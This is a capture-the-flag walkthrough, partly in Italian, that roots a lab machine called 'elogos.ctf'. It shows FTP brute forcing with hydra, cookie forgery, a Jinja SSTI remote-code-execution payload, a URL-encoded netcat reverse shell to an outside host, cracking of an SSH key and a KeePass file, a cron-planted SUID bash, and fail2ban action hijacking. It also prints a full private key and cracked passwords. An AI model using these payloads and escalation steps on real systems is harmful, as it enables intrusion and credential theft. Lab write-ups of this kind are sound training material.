### **PORT SCANNING**
```bash
nmap -Pn -sVC 192.168.86.129 -vvv
```
![[Pasted image 20231011153211.png]]

### **PATH 1 - FTP**
Directory enumeration
```bash
gobuster dir -e -u "https://192.168.86.129" -w /usr/share/wordlists/dirb/common.txt -k
```

Go to http://elogos.ctf/about-us and take note of the listed username (email)
![[Pasted image 20231011153524.png]]

After that launch a brute force with hydra on ftp to gain access
```
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ftp://elogos.ctf
```
==Creds = j.brock:princess==
ls -la and take the private ssh key. Crack it.
```
ssh2john id_rsa > hash
```
![[Pasted image 20231011153933.png]]![[Pasted image 20231011154601.png]]

Log in as j.brock via ssh
### **PATH 2 - WEB**

Directory enumeration
```bash
gobuster dir -e -u "https://192.168.86.129" -w /usr/share/wordlists/dirb/common.txt -k
```


*Cookie Bypass*
http://elogos.ctf/login
Use inspect to retrieve the cookie and decode it.
![[Pasted image 20231011154838.png]]
Change logged in to true and save it in the browser
```bash
echo 'eyJsb2dnZWRfaW4iOiBmYWxzZSwgInVzZXJuYW1lIjogIiJ9' | base64 -d
```
```bash
echo '{"logged_in": true, "username": ""}' | base64
```
*HardCoded Credentials*
Ci sono delle credenziali hardcodate al seguente path
https://elogos.ctf/assets/js/secure_credentials.js
admin:4dmin3vil!!
![[Pasted image 20231012173648.png]]
*Web to www-Data*
![[Pasted image 20231011154905.png]]
Use the "user=" parameter to inject the ssti payload and achieve a RCE
```python
{{request.application.__globals__.__builtins__.__import__('os').popen("id").read()}}
```
Usa la reverse shell url encodata
```bash
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.86.130%204444%20%3E%2Ftmp%2Ff
```
![[Pasted image 20231011155050.png]]
Now use the rce to obtain a reverse shell
![[Pasted image 20231012163853.png]]
*www-Data to John*
Scarica linpeas ed avvialo
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231011-b4d494e5/linpeas.sh
```
avvialo
```bash
./linpeas > out.txt
```
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231011-b4d494e5/linpeas.sh
```
catta id_rsa
``` bash
cat /home/j.brock/.ssh/id_rsa
```

```id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
qMfG6JM2YKLsLYHqT9T+dgZJqGc=
-----END OPENSSH PRIVATE KEY-----
```
e craccalo usando ssh2john
```
ssh2john id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
==Password = spaghetti==

Entra su ssh come j.brock
==ricorda chmod 400 su id_rsa==
### **j.brock to m.hack**
Scarica linpeas ed avvialo
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231011-b4d494e5/linpeas.sh
```

![[Pasted image 20231012165416.png]]
```bash
cat /etc/crontab
```
controlla i permessi della cartella
```bash
stat .
```
Vai in /scripts e crea un file random.py
```python
import os
os.system('cp /bin/bash /scripts/; chmod +s /scripts/bash')
```
![[Pasted image 20231012164950.png]]
Aspetta che runna tramite cronjob ed esegui il bash con suid creato
![[Pasted image 20231012165448.png]]

### **m.hack to r.silva**
Nella home di m.hack c'è un file keepass kdbx.
```
wget http://192.168.86.129:8080/mypasswords.kdbx
```
Usa keepass2john per craccarlo
```
keepass2john mypasswords.kdbx > hash
```
==Password = ihatehackers==

all'interno del keepass c'è la password per l'utente
==Password = JVQe4hUMqvCry4Gz996!n3==

Puoi fare
```bash
su m.hack
```
per stabilizzare la shell. Poi fai
```bash
sudo -l
```
![[Pasted image 20231012170444.png]]
crea il path ed il binario
```bash
mkdir .updates
cd .updates
mkdir tmp
cd tmp
vim update_binary
```
```update_binary
#/bin/bash

/bin/bash -p
```
==dai chmod +x al binario==
ed esegui il sudo come r.silva
```
sudo -u r.silva /home/m.hack/.updates/tmp/update_binary
```
==dai chmod +x al binario==
![[Pasted image 20231012170931.png]]

### **r.silva to root**
r.silva appartiene al gruppo fail2ban
![[Pasted image 20231012171109.png]]
andiamo a modificare i config di fail2ban
```bash
cd /etc/fail2ban
vim jail.conf
```
linea 268 per vedere che azione viene eseguita al trigger di fail2ban
![[Pasted image 20231012171431.png]]
linea 554 per attivarlo su vsftp
![[Pasted image 20231012171353.png]]
Ora vai a modificare l'action
```bash
cd action.d
vim log_alert.conf
```
![[Pasted image 20231012171555.png]]
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```
Aspetta il restart tramite cronjob (ogni minuto)
tenta di bruteforzare ftp per triggerare fail2ban
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/CommonAdminBase64.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.86.129
```
![[Pasted image 20231012172132.png]]
![[Pasted image 20231012172158.png]]
